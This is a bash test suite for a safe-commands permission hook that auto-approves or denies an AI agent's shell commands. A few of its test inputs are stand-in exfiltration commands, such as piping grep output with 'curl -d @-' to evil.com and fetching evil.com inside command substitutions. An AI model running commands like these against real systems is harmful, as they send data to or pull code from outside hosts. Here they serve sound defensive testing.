#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
HOOK="$REPO_ROOT/hooks/pretooluse-safe-commands.sh"
PASS=0
FAIL=0

assert_output_contains() {
  local desc="$1" output="$2" expected="$3"
  if echo "$output" | grep -qF "$expected"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected '$expected' in output)"
    ((FAIL++)) || true
  fi
}

assert_output_empty() {
  local desc="$1" output="$2"
  if [[ -z "$output" ]]; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected empty output, got: $output)"
    ((FAIL++)) || true
  fi
}

assert_file_contains() {
  local desc="$1" file="$2" expected="$3"
  if [[ -f "$file" ]] && grep -qF "$expected" "$file"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected '$expected' in $file)"
    ((FAIL++)) || true
  fi
}

assert_file_not_exists() {
  local desc="$1" file="$2"
  if [[ ! -f "$file" ]]; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (file should not exist: $file)"
    ((FAIL++)) || true
  fi
}

assert_output_contains_deny_with_reason() {
  local desc="$1" output="$2" expected_reason="$3"
  if echo "$output" | grep -qF '"permissionDecision":"deny"' && echo "$output" | grep -qF "$expected_reason"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected deny with reason containing '$expected_reason')"
    echo "  Got: $output"
    ((FAIL++)) || true
  fi
}

TMPDIR_TEST=$(mktemp -d)
trap 'rm -rf "$TMPDIR_TEST"' EXIT

run_hook() {
  local command="$1"
  local safe_file="$2"
  local log_file="$3"
  local json
  json=$(jq -n --arg cmd "$command" '{
    tool_name: "Bash",
    tool_input: { command: $cmd },
    session_id: "test-session"
  }')
  echo "$json" | CLAUDE_SAFE_COMMANDS_FILE="$safe_file" CLAUDE_SAFE_CMDS_LOG="$log_file" "$HOOK" 2>/dev/null || true
}

run_hook_override() {
  local command="$1"
  local bundled_file="$2"
  local user_file="$3"
  local log_file="$4"
  local json
  json=$(jq -n --arg cmd "$command" '{
    tool_name: "Bash",
    tool_input: { command: $cmd },
    session_id: "test-session"
  }')
  local hook_dir
  hook_dir="$(dirname "$HOOK")"
  local orig_safe="$hook_dir/safe-commands.txt"
  cp "$orig_safe" "$TMPDIR_TEST/orig-safe-commands.txt.bak" 2>/dev/null || true
  cp "$bundled_file" "$orig_safe"
  echo "$json" | CLAUDE_SAFE_COMMANDS_FILE="$user_file" CLAUDE_SAFE_CMDS_LOG="$log_file" "$HOOK" 2>/dev/null || true
  cp "$TMPDIR_TEST/orig-safe-commands.txt.bak" "$orig_safe" 2>/dev/null || true
}

echo "Test 1: Single safe command returns allow"
SAFE1="$TMPDIR_TEST/safe1.txt"
LOG1="$TMPDIR_TEST/log1.txt"
printf 'git\n' > "$SAFE1"
OUT1=$(run_hook "git status" "$SAFE1" "$LOG1")
assert_output_contains "single safe command returns allow" "$OUT1" "allow"

echo "Test 2: Single unsafe command falls through and logs"
SAFE2="$TMPDIR_TEST/safe2.txt"
LOG2="$TMPDIR_TEST/log2.txt"
printf 'git\n' > "$SAFE2"
OUT2=$(run_hook "curl https://example.com" "$SAFE2" "$LOG2")
assert_output_empty "single unsafe command has empty output" "$OUT2"
assert_file_contains "single unsafe command logs non-match" "$LOG2" "curl"

echo "Test 3: Compound command (&&) all safe returns allow"
SAFE3="$TMPDIR_TEST/safe3.txt"
LOG3="$TMPDIR_TEST/log3.txt"
printf 'git\nnpm\n' > "$SAFE3"
OUT3=$(run_hook "git add . && npm test" "$SAFE3" "$LOG3")
assert_output_contains "compound command all safe returns allow" "$OUT3" "allow"

echo "Test 4: Compound command with one unsafe falls through and logs"
SAFE4="$TMPDIR_TEST/safe4.txt"
LOG4="$TMPDIR_TEST/log4.txt"
printf 'git\n' > "$SAFE4"
OUT4=$(run_hook "git add . && curl https://evil.com" "$SAFE4" "$LOG4")
assert_output_empty "compound command with unsafe has empty output" "$OUT4"
assert_file_contains "compound command logs unsafe command" "$LOG4" "curl"

echo "Test 5: Pipe chain all safe returns allow"
SAFE5="$TMPDIR_TEST/safe5.txt"
LOG5="$TMPDIR_TEST/log5.txt"
printf 'grep\nsort\nwc\n' > "$SAFE5"
OUT5=$(run_hook "grep -r TODO | sort | wc -l" "$SAFE5" "$LOG5")
assert_output_contains "pipe chain all safe returns allow" "$OUT5" "allow"

echo "Test 6: Pipe with unsafe falls through"
SAFE6="$TMPDIR_TEST/safe6.txt"
LOG6="$TMPDIR_TEST/log6.txt"
printf 'grep\n' > "$SAFE6"
OUT6=$(run_hook "grep foo | curl -d @- https://evil.com" "$SAFE6" "$LOG6")
assert_output_empty "pipe with unsafe has empty output" "$OUT6"
assert_file_contains "pipe with unsafe logs non-match" "$LOG6" "curl"

echo "Test 7: Subshell \$() extraction -- inner command checked"
SAFE7="$TMPDIR_TEST/safe7.txt"
LOG7="$TMPDIR_TEST/log7.txt"
printf 'echo\ndate\n' > "$SAFE7"
# shellcheck disable=SC2016
OUT7=$(run_hook 'echo $(date)' "$SAFE7" "$LOG7")
assert_output_contains "subshell inner command checked and safe returns allow" "$OUT7" "allow"

echo "Test 8: Subshell with unsafe inner command falls through"
SAFE8="$TMPDIR_TEST/safe8.txt"
LOG8="$TMPDIR_TEST/log8.txt"
printf 'echo\n' > "$SAFE8"
# shellcheck disable=SC2016
OUT8=$(run_hook 'echo $(curl https://evil.com)' "$SAFE8" "$LOG8")
assert_output_empty "subshell with unsafe inner command has empty output" "$OUT8"
assert_file_contains "subshell with unsafe inner command logs non-match" "$LOG8" "curl"

echo "Test 9: Quoted strings not split"
SAFE9="$TMPDIR_TEST/safe9.txt"
LOG9="$TMPDIR_TEST/log9.txt"
printf 'echo\n' > "$SAFE9"
OUT9=$(run_hook 'echo "hello && world"' "$SAFE9" "$LOG9")
assert_output_contains "quoted string not split returns allow" "$OUT9" "allow"

echo "Test 10: Path basename extraction"
SAFE10="$TMPDIR_TEST/safe10.txt"
LOG10="$TMPDIR_TEST/log10.txt"
printf 'jest\n' > "$SAFE10"
OUT10=$(run_hook "./node_modules/.bin/jest --coverage" "$SAFE10" "$LOG10")
assert_output_contains "path basename extracted and matched returns allow" "$OUT10" "allow"

echo "Test 11: Variable assignment VAR=\$(cmd) extracts cmd"
SAFE11="$TMPDIR_TEST/safe11.txt"
LOG11="$TMPDIR_TEST/log11.txt"
printf 'git\n' > "$SAFE11"
# shellcheck disable=SC2016
OUT11=$(run_hook 'SHA=$(git rev-parse HEAD)' "$SAFE11" "$LOG11")
assert_output_contains "variable assignment subshell cmd extracted returns allow" "$OUT11" "allow"

echo "Test 12: Variable assignment with unsafe command falls through"
SAFE12="$TMPDIR_TEST/safe12.txt"
LOG12="$TMPDIR_TEST/log12.txt"
printf 'echo\n' > "$SAFE12"
# shellcheck disable=SC2016
OUT12=$(run_hook 'RESULT=$(curl https://evil.com)' "$SAFE12" "$LOG12")
assert_output_empty "variable assignment with unsafe cmd has empty output" "$OUT12"
assert_file_contains "variable assignment with unsafe cmd logs non-match" "$LOG12" "curl"

echo "Test 13: Empty command handled gracefully"
SAFE13="$TMPDIR_TEST/safe13.txt"
LOG13="$TMPDIR_TEST/log13.txt"
printf 'git\n' > "$SAFE13"
OUT13=$(run_hook "" "$SAFE13" "$LOG13")
assert_output_empty "empty command has empty output (no crash)" "$OUT13"

echo "Test 14: Semicolon separator treated like &&"
SAFE14="$TMPDIR_TEST/safe14.txt"
LOG14="$TMPDIR_TEST/log14.txt"
printf 'git\necho\n' > "$SAFE14"
OUT14=$(run_hook "git status; echo done" "$SAFE14" "$LOG14")
assert_output_contains "semicolon separator all safe returns allow" "$OUT14" "allow"

echo "Test 15: 20-command-word limit enforced"
SAFE15="$TMPDIR_TEST/safe15.txt"
LOG15="$TMPDIR_TEST/log15.txt"
printf 'echo\n' > "$SAFE15"
CMD15="echo 1 && echo 2 && echo 3 && echo 4 && echo 5 && echo 6 && echo 7 && echo 8 && echo 9 && echo 10 && echo 11 && echo 12 && echo 13 && echo 14 && echo 15 && echo 16 && echo 17 && echo 18 && echo 19 && echo 20 && echo 21"
OUT15=$(run_hook "$CMD15" "$SAFE15" "$LOG15")
assert_output_contains "21-segment command: first 20 all safe returns allow" "$OUT15" "allow"

echo "Test 16: User file overrides bundled (user file used exclusively)"
BUNDLED16="$TMPDIR_TEST/bundled16.txt"
USER16="$TMPDIR_TEST/user16.txt"
LOG16="$TMPDIR_TEST/log16.txt"
printf 'git\ncargo\n' > "$BUNDLED16"
printf 'cargo\n' > "$USER16"
OUT16=$(run_hook_override "git status" "$BUNDLED16" "$USER16" "$LOG16")
assert_output_empty "user file without git rejects git (override, not merge)" "$OUT16"

echo "Test 17: User file missing falls back to bundled"
BUNDLED17="$TMPDIR_TEST/bundled17.txt"
LOG17="$TMPDIR_TEST/log17.txt"
printf 'git\n' > "$BUNDLED17"
OUT17=$(run_hook_override "git status" "$BUNDLED17" "$TMPDIR_TEST/nonexistent.txt" "$LOG17")
assert_output_contains "bundled fallback (no user file) returns allow" "$OUT17" "allow"

echo "Test 18: User file with custom commands works"
BUNDLED18="$TMPDIR_TEST/bundled18.txt"
USER18="$TMPDIR_TEST/user18.txt"
LOG18="$TMPDIR_TEST/log18.txt"
printf 'git\n' > "$BUNDLED18"
printf 'git\ncargo\nbrew\n' > "$USER18"
OUT18=$(run_hook_override "cargo build && brew install jq" "$BUNDLED18" "$USER18" "$LOG18")
assert_output_contains "user file with custom commands returns allow" "$OUT18" "allow"

run_hook_tool() {
  local tool="$1"
  local json
  json=$(jq -n --arg t "$tool" '{tool_name: $t, tool_input: {}, session_id: "test-session"}')
  echo "$json" | bash "$HOOK" 2>/dev/null || true
}

echo "Test 19: Read-only built-in tools auto-approved"
for tool in Read Glob Grep Skill WebFetch WebSearch ToolSearch; do
  OUT19=$(run_hook_tool "$tool")
  assert_output_contains "$tool auto-approved" "$OUT19" "allow"
done

echo "Test 20: Non-safe built-in tools not auto-approved"
OUT20=$(run_hook_tool "Edit")
assert_output_empty "Edit not auto-approved" "$OUT20"

echo "Test 21: Hash comments in commands are skipped"
SAFE21="$TMPDIR_TEST/safe21.txt"
LOG21="$TMPDIR_TEST/log21.txt"
printf 'echo\ngit\n' > "$SAFE21"
OUT21=$(run_hook "$(printf 'echo hello\n# this is a comment\ngit status')" "$SAFE21" "$LOG21")
assert_output_contains "command with # comment returns allow" "$OUT21" "allow"

echo "Test 22: ln command is safe"
SAFE22="$TMPDIR_TEST/safe22.txt"
LOG22="$TMPDIR_TEST/log22.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE22"
OUT22=$(run_hook "ln -s /path/to/target /path/to/link" "$SAFE22" "$LOG22")
assert_output_contains "ln command returns allow" "$OUT22" "allow"

echo "Test 23: dirname command is safe"
SAFE23="$TMPDIR_TEST/safe23.txt"
LOG23="$TMPDIR_TEST/log23.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE23"
OUT23=$(run_hook 'dirname "/path/to/file"' "$SAFE23" "$LOG23")
assert_output_contains "dirname command returns allow" "$OUT23" "allow"

echo "Test 24: basename command is safe"
SAFE24="$TMPDIR_TEST/safe24.txt"
LOG24="$TMPDIR_TEST/log24.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE24"
OUT24=$(run_hook 'basename "/path/to/file.sh"' "$SAFE24" "$LOG24")
assert_output_contains "basename command returns allow" "$OUT24" "allow"

echo "Test 25: [ (test bracket) command is safe"
SAFE25="$TMPDIR_TEST/safe25.txt"
LOG25="$TMPDIR_TEST/log25.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE25"
OUT25=$(run_hook '[ -f "/path/to/file" ]' "$SAFE25" "$LOG25")
assert_output_contains "[ bracket command returns allow" "$OUT25" "allow"

echo "Test 26: command builtin is safe"
SAFE26="$TMPDIR_TEST/safe26.txt"
LOG26="$TMPDIR_TEST/log26.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE26"
OUT26=$(run_hook "command -v uv" "$SAFE26" "$LOG26")
assert_output_contains "command builtin returns allow" "$OUT26" "allow"

echo "Test 27: bash scripts/validate-plan denied with guidance"
SAFE27="$TMPDIR_TEST/safe27.txt"
LOG27="$TMPDIR_TEST/log27.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE27"
OUT27=$(run_hook "bash scripts/validate-plan --schema plan.json" "$SAFE27" "$LOG27")
assert_output_contains_deny_with_reason "bash + script denied with invoke-directly message" "$OUT27" "Do not use"

echo "Test 28: bash -e scripts/validate-plan denied with guidance"
SAFE28="$TMPDIR_TEST/safe28.txt"
LOG28="$TMPDIR_TEST/log28.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE28"
OUT28=$(run_hook "bash -e scripts/validate-plan --schema plan.json" "$SAFE28" "$LOG28")
assert_output_contains_deny_with_reason "bash -e + script denied with invoke-directly message" "$OUT28" "Do not use"

echo "Test 29: bash -euo pipefail denied with correct script name"
SAFE29="$TMPDIR_TEST/safe29.txt"
LOG29="$TMPDIR_TEST/log29.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE29"
OUT29=$(run_hook "bash -euo pipefail scripts/validate-plan" "$SAFE29" "$LOG29")
assert_output_contains_deny_with_reason "bash -euo pipefail denied with correct script" "$OUT29" "scripts/validate-plan"

echo "Test 30: bash with variable script arg denied with guidance"
SAFE30="$TMPDIR_TEST/safe30.txt"
LOG30="$TMPDIR_TEST/log30.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE30"
# shellcheck disable=SC2016
OUT30=$(run_hook 'bash "$SCRIPT_PATH"' "$SAFE30" "$LOG30")
assert_output_contains_deny_with_reason "bash + variable script denied" "$OUT30" "Do not use"

echo "Test 31: bare bash (no script) falls through"
SAFE31="$TMPDIR_TEST/safe31.txt"
LOG31="$TMPDIR_TEST/log31.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE31"
OUT31=$(run_hook "bash" "$SAFE31" "$LOG31")
assert_output_empty "bare bash not allowed" "$OUT31"

echo "Test 32: sh scripts/validate-plan denied with guidance"
SAFE32="$TMPDIR_TEST/safe32.txt"
LOG32="$TMPDIR_TEST/log32.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE32"
OUT32=$(run_hook "sh scripts/validate-plan --schema plan.json" "$SAFE32" "$LOG32")
assert_output_contains_deny_with_reason "sh + script denied with invoke-directly message" "$OUT32" "Do not use"

echo "Test 33: bash tests/hooks/test_safe_commands.sh denied with guidance"
SAFE33="$TMPDIR_TEST/safe33.txt"
LOG33="$TMPDIR_TEST/log33.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE33"
OUT33=$(run_hook "bash tests/hooks/test_safe_commands.sh" "$SAFE33" "$LOG33")
assert_output_contains_deny_with_reason "bash + script denied with invoke-directly message" "$OUT33" "Do not use"

echo "Test 34: \$VAR as command word triggers deny with feedback"
SAFE34="$TMPDIR_TEST/safe34.txt"
LOG34="$TMPDIR_TEST/log34.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE34"
# shellcheck disable=SC2016
OUT34=$(run_hook '$VALIDATE --help' "$SAFE34" "$LOG34")
assert_output_contains_deny_with_reason "\$VAR command denied with reason" "$OUT34" "shell variable"

echo "Test 35: \"\$VAR\" (quoted) as command word triggers deny with feedback"
SAFE35="$TMPDIR_TEST/safe35.txt"
LOG35="$TMPDIR_TEST/log35.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE35"
# shellcheck disable=SC2016
OUT35=$(run_hook '"$VALIDATE" --help' "$SAFE35" "$LOG35")
assert_output_contains_deny_with_reason "quoted \$VAR command denied with reason" "$OUT35" "shell variable"

echo "Test 36: \${VAR} as command word triggers deny with feedback"
SAFE36="$TMPDIR_TEST/safe36.txt"
LOG36="$TMPDIR_TEST/log36.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE36"
# shellcheck disable=SC2016
OUT36=$(run_hook '${VALIDATE} --help' "$SAFE36" "$LOG36")
assert_output_contains_deny_with_reason "\${VAR} command denied with reason" "$OUT36" "shell variable"

echo "Test 37: safe command + \$VAR compound still triggers deny"
SAFE37="$TMPDIR_TEST/safe37.txt"
LOG37="$TMPDIR_TEST/log37.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE37"
# shellcheck disable=SC2016
OUT37=$(run_hook 'git status && $DEPLOY' "$SAFE37" "$LOG37")
assert_output_contains_deny_with_reason "safe + \$VAR compound denied" "$OUT37" "shell variable"

echo "Test 38: bash -c 'command string' denied with guidance"
SAFE38="$TMPDIR_TEST/safe38.txt"
LOG38="$TMPDIR_TEST/log38.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE38"
OUT38=$(run_hook "bash -c 'command -v foo'" "$SAFE38" "$LOG38")
assert_output_contains_deny_with_reason "bash -c denied with guidance" "$OUT38" "Do not use"

echo "Test 39: bash -- scripts/validate-plan denied with guidance"
SAFE39="$TMPDIR_TEST/safe39.txt"
LOG39="$TMPDIR_TEST/log39.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE39"
OUT39=$(run_hook "bash -- scripts/validate-plan --schema plan.json" "$SAFE39" "$LOG39")
assert_output_contains_deny_with_reason "bash -- + script denied with invoke-directly message" "$OUT39" "Do not use"

echo ""
echo "$PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]]
